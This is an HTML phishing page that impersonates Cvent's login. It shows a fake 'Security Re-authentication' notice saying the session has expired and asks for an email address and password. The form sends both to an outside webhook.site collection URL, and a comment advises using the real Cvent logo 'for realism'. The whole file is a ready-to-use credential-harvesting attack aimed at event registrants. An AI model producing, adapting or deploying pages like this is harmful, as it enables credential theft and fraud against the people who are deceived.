<!DOCTYPE html>
<html>
<head>
    <title>Cvent - Session Timeout</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        img { width: 120px; margin-bottom: 20px; }
        h2 { color: #333; font-size: 20px; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:hover { background: #0052a3; }
    </style>
</head>
<body>
    <div class="login-box">
        <!-- Replace with a public Cvent logo URL for realism -->
        <img src="https://www.cvent.com/sites/default/files/cvent-logo.png" alt="Cvent">
        <h2>Security Re-authentication</h2>
        <p>Your session has expired. Please re-enter your password to finalize your event registration.</p>
        <form action="https://webhook.site/741d9f61-092b-4571-a172-86c45c1110aa" method="POST">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify & Continue</button>
        </form>
    </div>
</body>
</html>
